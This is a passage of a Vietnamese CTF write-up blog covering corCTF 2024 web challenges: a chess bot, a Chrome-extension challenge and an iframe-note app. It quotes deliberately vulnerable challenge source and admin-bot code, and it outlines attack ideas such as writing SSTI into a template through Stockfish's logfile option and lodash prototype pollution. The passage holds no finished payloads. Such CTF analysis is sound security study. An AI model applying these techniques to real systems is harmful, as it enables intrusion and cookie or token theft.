+{'pos': 'rnbq1bnr/ppppkppp/8/4N3/4P3/8/PPPP1PPP/RNBQKB1R b KQ - 0 3', 'moves': ['g8h6', 'g8f6', 'd8e8', 'b8c6', 'b8a6', 'e7e8', 'e7f6', 'e7e6', 'e7d6', 'h7h6', 'g7g6', 'f7f6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '3 / 15 turns'}
+SENDING e7d6
+🐸: so bad lmfaoo
+Current state:
+{'pos': 'rnbq1bnr/pppp1Npp/3k4/8/4P3/8/PPPP1PPP/RNBQKB1R b KQ - 0 4', 'moves': ['d6e7', 'd6e6', 'd6c6', 'd6c5'], 'your_turn': True, 'status': 'running', 'turn_counter': '4 / 15 turns'}
+SENDING d6c5
+Current state:
+{'pos': 'rnbq1bnr/pppp1Npp/8/2k5/4P3/8/PPPPQPPP/RNB1KB1R b KQ - 2 5', 'moves': ['g8e7', 'g8h6', 'g8f6', 'f8e7', 'f8d6', 'd8e8', 'd8e7', 'd8f6', 'd8g5', 'd8h4', 'b8c6', 'b8a6', 'c5c6', 'c5b6', 'c5d4', 'c5b4', 'h7h6', 'g7g6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'd7d5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '5 / 15 turns'}
+SENDING c5d4
+Current state:
+{'pos': 'rnbq1bnr/pppp1Npp/8/8/3kP3/4Q3/PPPP1PPP/RNB1KB1R b KQ - 4 6', 'moves': [], 'your_turn': True, 'status': 'win', 'turn_counter': '6 / 15 turns'}
+SENDING d4d3
+🐸: how??????
+System: corctf{this_is_a_fake_flag}
+System: An error occurred, please restart
+
+</code></pre><h3 id="solution-2">solution 2</h3>
+<ul>
+<li>Câu trả lời được trả lời ở phần nâng cao của UCI command của stockfish ở <a href="https://github.com/official-stockfish/Stockfish/wiki/UCI-&amp;-Commands">đây</a>.</li>
+<li>ở mục <a href="https://github.com/official-stockfish/Stockfish/wiki/UCI-&amp;-Commands#setoption">option</a> có thể thấy</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SkAgMM9K0.png" alt="image"></p>
+<ul>
+<li>Option debug logfile sẽ <code>Ghi mọi thông tin liên lạc đến và đi từ động cơ vào một tệp văn bản</code> -&gt; vậy ý tưởng là ghi SSTI vào trong file template <code>jinja2</code>.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1Zx98qYC.png" alt="image"></p>
+<ul>
+<li>Đây là file index.html templates của chúng ta trước khi tess -&gt; nhưng vấn đề gặp phải là uci bị check format và chưa có cách nào để write SSTI vào index. [Đang nghiên cứu thêm solution này]</li>
+</ul>
+<p>flag: <code>corctf{replace}</code> như hình thì có vẻ end giải rồi nên khởi tạo flag bị sai</p>
+<h2 id="corctf-challenge-dev">corctf-challenge-dev</h2>
+<ul>
+<li>Một thử thách với nodejs -&gt; khai thác bug của extention chrome + template ejs.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BkQZqOPY0.png" alt="image"></p>
+<h3 id="analysis-2">analysis</h3>
+<ul>
+<li>Đi vào phân tích source của chall.</li>
+</ul>
+<pre><code>// index.js
+const express = require(&quot;express&quot;);
+const crypto = require(&quot;crypto&quot;);
+const session = require(&quot;express-session&quot;);
+const MemoryStore = require(&quot;memorystore&quot;)(session)
+
+const app = express();
+
+const PORT = process.env.PORT || 8080;
+
+const db = require(&quot;./db.js&quot;);
+const bot = require(&quot;./bot/bot.js&quot;);
+
+app.use(
+    session({
+        cookie: { maxAge: 3600000 },
+        store: new MemoryStore({
+            checkPeriod: 3600000,
+        }),
+        resave: false,
+        saveUninitialized: false,
+        secret: crypto.randomBytes(32).toString(&quot;hex&quot;),
+    })
+);
+
+app.use(express.static(&quot;public&quot;));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.use((req, res, next) =&gt; {
+	const nonce = crypto.randomBytes(16).toString('base64');
+    res.setHeader(
+        &quot;Content-Security-Policy&quot;,
+        `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
+    );
+    res.locals.user = null;
+    if (req.session.user &amp;&amp; db.hasUser({user: req.session.user})) {
+        req.user = db.getUser({user: req.session.user});
+        res.locals.user = req.user;
+	}
+	res.locals.nonce = nonce;
+    next();
+});
+
+app.set('view engine', 'ejs');
+
+app.use(&quot;/api&quot;, require(&quot;./routes/api.js&quot;));
+
+const requiresLogin = (req, res, next) =&gt; 
+	req.user
+		? next()
+		: res.redirect('/login');
+
+app.get(&quot;/&quot;, (req, res) =&gt; res.render(&quot;index&quot;));
+
+app.get(&quot;/login&quot;, (req, res) =&gt; res.render(&quot;login&quot;));
+
+app.get(&quot;/register&quot;, (req, res) =&gt; res.render(&quot;register&quot;));
+
+app.get(&quot;/create&quot;, requiresLogin, (req, res) =&gt; res.render(&quot;create&quot;));
+
+app.get(&quot;/challenges&quot;, requiresLogin, (req, res) =&gt; res.render(&quot;challenges&quot;));
+
+app.get(&quot;/challenge/:id&quot;, (req, res) =&gt; {
+    let { id } = req.params;
+    if (!id) {
+        return res.json({ success: false, error: &quot;No id provided&quot; });
+    }
+    if (!db.hasChallenge({id: id})) {
+        return res.status(404).send(&quot;Challenge not found!&quot;);
+    }
+	challenge = db.getChallenge({id: id});
+	res.render('challenge', { challenge });
+});
+
+app.get(&quot;/submit&quot;, requiresLogin, (req, res) =&gt; {
+    const { url } = req.query;
+    
+    if (!url || typeof url !== &quot;string&quot;) {
+        return res.send('missing url');
+    }
+
+    const urlObj = new URL(url);
+    if (!['http:', 'https:'].includes(urlObj.protocol)) {
+        return res.send('url must be http/https')
+    }
+
+    bot.visit(url);
+    res.send('the admin will visit your url soon');
+});
+
+app.listen(PORT, () =&gt; console.log(`app listening on port ${PORT}`));
+</code></pre><ul>
+<li>Có các chức năng là register -&gt; login -&gt; create challenges -&gt; view challenges -&gt; submit url của chall cho admin là bot chạy với pupperteer:</li>
+</ul>
+<pre><code>const crypto = require(&quot;crypto&quot;);
+
+const users = new Map();
+const challenges = new Map();
+
+const sha256 = (data) =&gt; crypto.createHash(&quot;sha256&quot;).update(data).digest(&quot;hex&quot;);
+
+const addUser = ({ user, pass }) =&gt; {
+	users.set(user, {
+		pass: sha256(pass),
+		challenges: [],
+	});
+};
+
+const hasUser = ({ user }) =&gt; {
+	return users.has(user);
+}
+
+const getUser = ({ user }) =&gt; {
+	return users.get(user);
+}
+
+const checkPass = ({ user, pass }) =&gt; {
+	return users.get(user).pass === sha256(pass)
+}
+
+const addChallenge = ({title, description}) =&gt; {
+	let id = crypto.randomBytes(6).toString(&quot;hex&quot;);
+	challenges.set(id, { id, title, description });
+	return id;
+}
+
+const hasChallenge = ({ id }) =&gt; {
+	return challenges.has(id);
+}
+
+const getChallenge = ({ id }) =&gt; {
+	return challenges.get(id);
+}
+
+module.exports = { users, challenges, addUser, hasUser, getUser, checkPass, addChallenge, hasChallenge, getChallenge };
+
+</code></pre><ul>
+<li>Dưới đây là api chính của server:</li>
+</ul>
+<pre><code>// api.js
+
+const express = require(&quot;express&quot;);
+const db = require(&quot;../db.js&quot;);
+
+const router = express.Router();
+
+const requiresLogin = (req, res, next) =&gt;
+    req.user
+        ? next()
+        : res.json({ success: false, error: &quot;You must be logged in!&quot; });
+
+router.post(&quot;/login&quot;, (req, res) =&gt; {
+    let { user, pass } = req.body;
+    if (!user || !pass || typeof user !== &quot;string&quot; || typeof pass !== &quot;string&quot;) {
+        return res.json({
+            success: false,
+            error: &quot;Missing username or password&quot;,
+        });
+    }
+
+    if (!db.hasUser({user: user})) {
+        return res.json({
+            success: false,
+            error: &quot;No user exists with that username&quot;,
+        });
+    }
+
+    if (!db.checkPass({user: user, pass: pass})) {
+        return res.json({ success: false, error: &quot;Invalid password&quot; });
+    }
+
+    req.session.user = user;
+    res.json({ success: true });
+});
+
+router.post(&quot;/register&quot;, (req, res) =&gt; {
+    let { user, pass } = req.body;
+    if ( !user || !pass || typeof user !== &quot;string&quot; || typeof pass !== &quot;string&quot;) {
+        return res.json({
+            success: false,
+            error: &quot;Missing username or password&quot;,
+        });
+    }
+
+    if (db.hasUser({user: user})) {
+        return res.json({
+            success: false,
+            error: &quot;User already exists&quot;,
+        });
+    }
+
+    req.session.user = user;
+	db.addUser({user: user, pass: pass});
+    res.json({ success: true });
+});
+
+router.post(&quot;/create&quot;, requiresLogin, (req, res) =&gt; {
+    let { title, description } = req.body;
+    if (!title || !description || typeof title !== &quot;string&quot; || typeof description !== &quot;string&quot;) {
+        return res.json({ success: false, error: &quot;Missing title or description&quot; });
+    }
+
+    req.user.challenges.push(db.addChallenge({title: title, description: description}));
+
+    res.json({ success: true });
+});
+
+router.post(&quot;/challenges&quot;, requiresLogin, (req, res) =&gt; {
+    return res.json({
+        success: true,
+        data: req.user.challenges.map((id) =&gt; db.getChallenge({id: id})),
+    });
+});
+
+module.exports = router;
+</code></pre><ul>
+<li>Như đã nói ở trên thì api chính đó là <code>/create</code> và tạo challenge.</li>
+</ul>
+<p>-&gt; Vậy thì flag nằm ở đâu -&gt; với các thử thách client hiện nay thì nó nằm ở bot:</p>
+<pre><code>const puppeteer = require(&quot;puppeteer&quot;);
+
+const FLAG = process.env.FLAG || &quot;corctf{test_flag}&quot;;
+
+const sleep = (ms) =&gt; new Promise(r =&gt; setTimeout(r, ms));
+
+const path = require(&quot;path&quot;);
+const ext = path.resolve(__dirname, &quot;./extension/&quot;);
+
+const visit = async (url) =&gt; {
+    let browser;
+    try {
+        browser = await puppeteer.launch({
+            headless: &quot;new&quot;,
+            pipe: true,
+            args: [
+                &quot;--no-sandbox&quot;,
+                &quot;--disable-setuid-sandbox&quot;,
+                `--disable-extensions-except=${ext}`,
+                `--load-extension=${ext}`
+            ],
+            dumpio: true
+        });
+
+        const page = await browser.newPage();
+        // NOTE: this is where the flag is on remote
+        await page.goto(&quot;http://localhost:8080&quot;, { timeout: 5000, waitUntil: 'networkidle2' });
+
+        page.evaluate((flag) =&gt; {
+            document.cookie = &quot;flag=&quot; + flag;
+        }, FLAG);
+
+        // go to exploit page
+        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' });
+        await sleep(10_000);
+
+        await browser.close();
+        browser = null;
+    } catch (err) {
+        console.log(err);
+    } finally {
+        if (browser) await browser.close();
+    }
+};
+
+module.exports = { visit };
+</code></pre><h3 id="extension">extension</h3>
+<ul>
+<li>Trên môi trường production thì FLAG nằm ở env và sẽ được gắn vào trong cookie của browser như trên -&gt; bot sẽ load đến server trước sau đó sẽ <code>goto</code> url mà chúng ta submit -&gt; để ý là ở đây pupperteer sẽ sử dụng trình duyệt chrome có sẵn extension được config sẵn:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rJ9w3dPtC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByVQpdvKC.png" alt="image"></p>
+<ul>
+<li>Đi vào xem xét cách hoạt động của extension này:</li>
+<li>Theo như trực quan ở hình trên ta thấy thì nó được render từ <code>form_handler.js</code></li>
+</ul>
+<pre><code>const origin = window.location.origin;
+
+const base_rule = {
+	&quot;action&quot;: {
+		&quot;type&quot;: &quot;block&quot;,
+		&quot;redirect&quot;: {},
+		&quot;responseHeaders&quot;: [],
+		&quot;requestHeaders&quot;: []
+	},
+	&quot;condition&quot;: {
+		&quot;initiatorDomains&quot;: [origin],
+		&quot;resourceTypes&quot;: ['image', 'media', 'script']
+	}
+};
+
+function serializeForm(items) {
+    const result = {};
+    items.forEach(([key, value]) =&gt; {
+        const keys = key.split('.');
+        let current = result;
+		for (let i = 0; i &lt; keys.length - 1; i++) {
+            const k = keys[i];
+            if (!(k in current)) {
+                current[k] = {};
+            }
+            current = current[k];
+        }
+        current[keys[keys.length - 1]] = isNaN(value) ? value : Number(value);
+    });
+
+    return result;
+}
+
+// inject modal
+const modal = document.createElement('div');
+modal.id = 'block-modal';
+modal.classList.add('modal');
+
+modal.innerHTML = `&lt;div class=&quot;modal-content&quot;&gt;
+					&lt;span class=&quot;close&quot;&gt;&amp;times;&lt;/span&gt;
+					&lt;form id='block-options'&gt;
+						&lt;fieldset&gt;
+							&lt;legend&gt;Block URL&lt;/legend&gt;
+							&lt;label for='priority'&gt;Priority:&lt;/label&gt;
+							&lt;input type='text' id='priority' name='priority'&gt;
+							&lt;div id='condition'&gt;
+								&lt;label for='urlFilter'&gt;Blocked URL:&lt;/label&gt;
+								&lt;input type='text' id='urlFilter' name='condition.urlFilter'&gt;&lt;br&gt;
+							&lt;/div&gt;
+							&lt;button type='button' id='submit-btn' class='fizzblock'&gt;Add URL!&lt;/button&gt;
+						&lt;/fieldset&gt;
+					&lt;/form&gt;
+				  &lt;/div&gt;`;
+
+modal.querySelector('#submit-btn').addEventListener('click', async () =&gt; {
+	const obj = serializeForm(Array.from(new FormData(document.getElementById('block-options'))));
+	const merged_obj = _.merge(base_rule, obj);
+
+	chrome.storage.local.get(origin).then((data) =&gt; {
+		let arr = data[origin];
+		if (arr == null) {
+			arr = [];
+		}
+		arr.push(merged_obj);
+		console.log(merged_obj);
+		chrome.storage.local.set(Object.fromEntries([[origin, arr]]));
+	});
+});
+
+// listeners to close modal
+modal.querySelector('.close').addEventListener('click', () =&gt; {modal.style.display = 'none';});
+window.addEventListener('click', (event) =&gt; {
+	if (event.target == modal) {
+		modal.style.display = 'none';
+	}
+});
+
+document.body.insertBefore(modal, document.body.childNodes[0]);
+
+// inject modal trigger button
+const modal_button = document.createElement('button');
+modal_button.type = 'button';
+modal_button.id = 'modal-button';
+modal_button.classList.add('fizzblock');
+modal_button.textContent = &quot;Open block settings&quot;;
+
+// modal listener
+modal_button.addEventListener('click', async () =&gt; {
+	const modal = document.getElementById('block-modal');
+	modal.style.display = 'block';
+});
+
+document.body.insertBefore(modal_button, document.body.childNodes[0]);
+</code></pre><ul>
+<li>
+<p>Đầu tiên thì khởi tạo các biến là origin -&gt; gán bằng window.location.origin, base_rule có vẻ như là điều lệ cơ bản của tiện ích này.</p>
+</li>
+<li>
+<p>Sau đó tạo một modal và hiển thị form như ta thấy ở trên -&gt; khi ta mở modal ra tức là click vào button <code>open block settings</code> thì sẽ gọi hàm <code>serializeForm</code> với các value mà ta điền vào form -&gt; trả ra một object sau khi xử lí -&gt; gọi <code>_.merge(base_rule, obj);</code> hàm merge này được lấy từ thư viện Lodash -&gt; lưu các giá trị theo từng origin vào <code>storage</code> của chrome theo dạng origin: array.</p>
+</li>
+<li>
+<p>Tiếp theo ta chú ý đến back-ground js của extension này là:</p>
+</li>
+</ul>
+<pre><code>// request-handler.js
+
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) =&gt; {
+	if (changeInfo.status == 'loading' &amp;&amp; tab.url.indexOf(tab.index &gt; -1)) {
+		const origin = (new URL(tab.url)).origin;
+		registerRules(origin);
+	}
+});
+
+const registerRules = (url) =&gt; {
+	chrome.storage.local.get(url).then((data) =&gt; {
+		const arr = data[url];
+		if (arr != null) {
+			for (let i = 0; i &lt; arr.length; i++) {
+				const rule = arr[i];
+				rule['id'] = i+1;
+				chrome.declarativeNetRequest.updateDynamicRules({
+					addRules: [
+						rule
+					],
+					removeRuleIds: [i+1]
+				});
+			}
+		}
+	});
+};
+
+// rules for corctf-challenge-dev.be.ax
+const rules = [
+{
+	&quot;action&quot;: { // fizzbuzz hates microsoft!
+		&quot;type&quot;: &quot;block&quot;,
+		&quot;redirect&quot;: {},
+		&quot;responseHeaders&quot;: [],
+		&quot;requestHeaders&quot;: []
+	},
+	&quot;condition&quot;: {
+		&quot;initiatorDomains&quot;: [&quot;corctf-challenge-dev.be.ax&quot;],
+		&quot;resourceTypes&quot;: ['image', 'media', 'script'],
+		&quot;urlFilter&quot;: &quot;https://microsoft.com*&quot;
+	}
+},
+{
+	&quot;action&quot;: { // block subdomains too
+		&quot;type&quot;: &quot;block&quot;,
+		&quot;redirect&quot;: {},
+		&quot;responseHeaders&quot;: [],
+		&quot;requestHeaders&quot;: []
+	},
+	&quot;condition&quot;: {
+		&quot;initiatorDomains&quot;: [&quot;corctf-challenge-dev.be.ax&quot;],
+		&quot;resourceTypes&quot;: ['image', 'media', 'script'],
+		&quot;urlFilter&quot;: &quot;https://*.microsoft.com*&quot;
+	}
+},
+{
+	&quot;action&quot;: { // fizzbuzz hates systemd!
+		&quot;type&quot;: &quot;block&quot;,
+		&quot;redirect&quot;: {},
+		&quot;responseHeaders&quot;: [],
+		&quot;requestHeaders&quot;: []
+	},
+	&quot;condition&quot;: {
+		&quot;initiatorDomains&quot;: [&quot;corctf-challenge-dev.be.ax&quot;],
+		&quot;resourceTypes&quot;: ['image', 'media', 'script'],
+		&quot;urlFilter&quot;: &quot;https://systemd.io*&quot;
+	}
+}
+];
+
+chrome.storage.local.set({&quot;https://corctf-challenge-dev.be.ax&quot;: rules});
+</code></pre><ul>
+<li>
+<p>Như ở form-handler ta thấy khi mà mở modal và nhập form ta sẽ lấy dữ liệu từ <code>chrome.storage</code> và nó diễn ra tại đây.</p>
+</li>
+<li>
+<p>Quay trở lại với server thì ta có thể thấy CSP đã được set để tránh XSS được xảy ra.</p>
+</li>
+</ul>
+<pre><code>app.use((req, res, next) =&gt; {
+	const nonce = crypto.randomBytes(16).toString('base64');
+    res.setHeader(
+        &quot;Content-Security-Policy&quot;,
+        `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
+    );
+    res.locals.user = null;
+    if (req.session.user &amp;&amp; db.hasUser({user: req.session.user})) {
+        req.user = db.getUser({user: req.session.user});
+        res.locals.user = req.user;
+	}
+	res.locals.nonce = nonce;
+    next();
+});
+</code></pre><h2 id="iframe-note">iframe-note</h2>
+<p><img src="https://hackmd.io/_uploads/H1ubND9KC.png" alt="image"></p>
+<p>Một chall với python flask + sqlite + pupperteer for report with admin.</p>
+<ul>
+<li>Nhìn thấy bot là ta nghĩ ngay đến khả năng cao là vul client như xss, csrf,&hellip;</li>
+</ul>
+<p>-&gt; đi vào phân tích mã nguồn của server</p>
+<h3 id="analyst-1">analyst</h3>
+<ul>
+<li>Cơ bản thì chương trình có có như sau:</li>
+</ul>
+<pre><code>from flask import Flask, session, request, flash, redirect, url_for, render_template
+import hashlib
+import secrets
+import sqlite3
+import os
+
+app = Flask(__name__)
+app.secret_key = os.getenv(&quot;SECRET_KEY&quot;, secrets.token_hex(16))
+
+conn = sqlite3.connect(&quot;iframe-note.db&quot;, isolation_level=None)
+
+cursor = conn.cursor()
+cursor.execute('pragma journal_mode=WAL')
+cursor.execute(&quot;&quot;&quot;
+CREATE TABLE IF NOT EXISTS users (
+    username TEXT PRIMARY KEY, password TEXT NOT NULL
+);
+&quot;&quot;&quot;)
+cursor.execute(&quot;&quot;&quot;
+CREATE TABLE IF NOT EXISTS iframes (
+    id TEXT PRIMARY KEY, author TEXT NOT NULL, name TEXT NOT NULL, url TEXT NOT NULL, style TEXT
+);
+&quot;&quot;&quot;)
+cursor.close()
+
+def add_user(username, password):
+    cursor = conn.cursor()
+    cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, hashlib.sha256(password.encode()).hexdigest()))
+    cursor.close()
+
+def add_iframe(author, name, url, style = None):
+    cursor = conn.cursor()
+    cursor.execute(&quot;INSERT INTO iframes (id, author, name, url, style) VALUES (?, ?, ?, ?, ?)&quot;, (secrets.token_hex(16), author, name, url, style))
+    cursor.close()
+
+def get_iframe(id):
+    cursor = conn.cursor()
+    iframe = cursor.execute(&quot;SELECT name, url, style FROM iframes WHERE id = ?&quot;, (id,)).fetchone()
+    cursor.close()
+    return iframe
+
+def get_iframes(author):
+    cursor = conn.cursor()
+    iframes = cursor.execute(&quot;SELECT id, name FROM iframes WHERE author = ?&quot;, (author,)).fetchall()
+    cursor.close()
+    return iframes
+
+def get_user(username):
+    cursor = conn.cursor()
+    user = cursor.execute(&quot;SELECT username, password FROM users WHERE username = ?&quot;, (username,)).fetchone()
+    cursor.close()
+    return user
+
+# might fail since multiple workers try to all add admin
+try:
+    add_user(&quot;admin&quot;, os.getenv(&quot;ADMIN_PASSWORD&quot;, &quot;erm&quot;))
+except:
+    pass
+
+@app.get(&quot;/&quot;)
+def index():
+    if session.get(&quot;user&quot;):
+        iframes = get_iframes(session[&quot;user&quot;])
+        return render_template(&quot;home.html&quot;, user=session[&quot;user&quot;], iframes=iframes)
+    return render_template(&quot;index.html&quot;)
+
+@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def login():
+    if request.method == &quot;POST&quot;:
+        username, password = request.form[&quot;username&quot;], request.form[&quot;password&quot;]
+        user = get_user(username)
+    
+        if user and user[1] == hashlib.sha256(password.encode()).hexdigest():
+            session[&quot;user&quot;] = username
+            return redirect(url_for(&quot;index&quot;))
+
+        flash(&quot;invalid username or password&quot;, &quot;error&quot;)
+        return redirect(url_for(&quot;login&quot;))
+    return render_template(&quot;login.html&quot;)
+
+@app.route(&quot;/register&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def register():
+    if request.method == &quot;POST&quot;:
+        username, password = request.form[&quot;username&quot;], request.form[&quot;password&quot;]
+
+        if len(username) &lt; 5 or len(password) &lt; 7:
+            flash(&quot;username must be at least 5 characters long and password must be at least 7 characters long&quot;, &quot;error&quot;)
+            return redirect(url_for(&quot;register&quot;))
+        
+        if not username.isalnum():
+            flash(&quot;username must be alphanumeric&quot;, &quot;error&quot;)
+            return redirect(url_for(&quot;register&quot;))
+
+        if username in password:
+            flash(&quot;username cannot be contained in the password&quot;, &quot;error&quot;)
+            return redirect(url_for(&quot;register&quot;))
+
+        if get_user(username):
+            flash(&quot;username already taken&quot;, &quot;error&quot;)
+            return redirect(url_for(&quot;register&quot;))
+        
+        add_user(username, password)
+        session[&quot;user&quot;] = username
+
+        return redirect(url_for(&quot;index&quot;))
+    return render_template(&quot;register.html&quot;)
+
+@app.post(&quot;/create&quot;)
+def create():
+    if not session.get(&quot;user&quot;):
+        flash(&quot;you must be logged in to create an iframe&quot;, &quot;error&quot;)
+        return redirect(url_for(&quot;index&quot;))
+    
+    if session[&quot;user&quot;] == &quot;admin&quot;:
+        flash(&quot;admin cannot create iframes&quot;, &quot;error&quot;)
+        return redirect(url_for(&quot;index&quot;))
+
+    name, url, style = request.form[&quot;name&quot;], request.form[&quot;url&quot;], request.form[&quot;style&quot;]
+
+    if not name or not url:
+        flash(&quot;name and url cannot be empty&quot;, &quot;error&quot;)
+        return redirect(url_for(&quot;index&quot;))
+
+    if not url.lower().startswith(&quot;http&quot;):
+        flash(&quot;url must start with http or https&quot;, &quot;error&quot;)
+        return redirect(url_for(&quot;index&quot;))
+    
+    add_iframe(session[&quot;user&quot;], name, url, style)
+    return redirect(url_for(&quot;index&quot;))
+
+@app.get(&quot;/view&quot;)
+def view():
+    return render_template(&quot;view.html&quot;)
+
+@app.get(&quot;/iframe/&lt;id&gt;&quot;)
+def iframe(id):
+    iframe = get_iframe(id)
+    if not iframe:
+        return { &quot;error&quot;: &quot;iframe not found&quot; }
+    return { &quot;name&quot;: iframe[0], &quot;url&quot;: iframe[1], &quot;style&quot;: iframe[2] }
+</code></pre><p>-&gt; đầu tiên thì sẽ khởi tạo các bảng <code>users</code> <code>iframes</code> với các cột chứa dữ liệu tương ứng -&gt; insert username <code>admin</code> với secret passwd vào trong bảng users.</p>
+<p>Các api chính:</p>
+<h4 id="api-">api /</h4>
+<ul>
+<li>Sẽ trả ra tất cả id + name của template tương ứng với session user sau đó hiển thị ra <code>home</code></li>
+</ul>
+<h4 id="api-login--register---đăng-kí--đăng-nhập">api /login + /register -&gt; đăng kí &amp; đăng nhập</h4>
+<h4 id="api-create">api /create</h4>
+<ul>
+<li>Nhận <code>name, url, style</code> từ client -&gt; thêm dữ liệu vào trong bảng users</li>
+</ul>
+<h4 id="api-view---hiển-thị-view-template">api /view -&gt; hiển thị view template</h4>
+<h4 id="api-iframeid">api /iframe/<code>&lt;id&gt;</code></h4>
+<ul>
+<li>
+<p>Trả ra <code>name, url, style</code> tương ứng với id sau đó hiển thị kết quả trực tiếp dưới dạng json</p>
+</li>
+<li>
+<p>Chuyển qua mã của bot-admin:</p>
+</li>
+</ul>
+<pre><code>// npm i puppeteer
+const puppeteer = require(&quot;puppeteer&quot;);
+
+const TEST_USER = &quot;test_user&quot;;
+const TEST_PASSWORD = &quot;test_password&quot;;
+const FLAG = &quot;corctf{test_flag}&quot;;
+const SITE = &quot;https://iframe-note.be.ax&quot;;
+
+function sleep(time) {
+    return new Promise(resolve =&gt; {
+        setTimeout(resolve, time)
+    })
+}
+
+const visit = async (url) =&gt; {
+    if (!/^https:\/\/iframe-note\.be\.ax\/view\?id=[A-Fa-f0-9]+$/.test(url)) {
+        console.log('[warning]: invalid url! you cannot submit this to the admin bot.');
+    }
+
+    let browser;
+    try {
+        browser = await puppeteer.launch({
+            headless: true,
+            pipe: true,
+            args: [
+                &quot;--no-sandbox&quot;,
+                &quot;--disable-setuid-sandbox&quot;,
+                &quot;--js-flags=--noexpose_wasm,--jitless&quot;,
+            ],
+            dumpio: true
+        });
+
+        const ctx = browser.createBrowserContext();
+
+        const page = await ctx.newPage();
+        await page.goto(`${SITE}/login`, { timeout: 5000, waitUntil: 'networkidle2' });
+
+        await page.evaluate((flag) =&gt; {
+            localStorage.setItem(&quot;flag&quot;, flag);
+        }, FLAG);
+
+        await page.waitForSelector('input[name=&quot;username&quot;]', { timeout: 5000 });
+
+        await page.type('input[name=&quot;username&quot;]', TEST_USER);
+        await page.type('input[name=&quot;password&quot;]', TEST_PASSWORD);
+        await page.click('input[type=&quot;submit&quot;]');
+        
+        await sleep(3000);
+        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' });
+
+        await sleep(8000);
+
+        await browser.close();
+        browser = null;
+    } catch (err) {
+        console.log(err);
+    } finally {
+        if (browser) await browser.close();
+    }
+};
+
+visit(&quot;TARGET_URL&quot;);
+</code></pre><ul>
+<li>Đầu tiên là bot chỉ nhận url đến view/?id=[replace] -&gt; sẽ di chuyển đến trang login -&gt; lưu flag vào trong localStorage của trình duyệt -&gt; nhập username + password đăng nhập -&gt; sleep 3s -&gt; di chuyển đến url vừa nhận.</li>
+</ul>
+<h3 id="detect">detect</h3>
+<ul>
+<li>Prototype polution</li>
+</ul>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-10-ctfzone2024/" data-toggle="tooltip" data-placement="top" title="CtfZone2024 - WEB &#39;s challenges">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2023-01-14-cookiearena/" data-toggle="tooltip" data-placement="top" title="Cookie arena">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
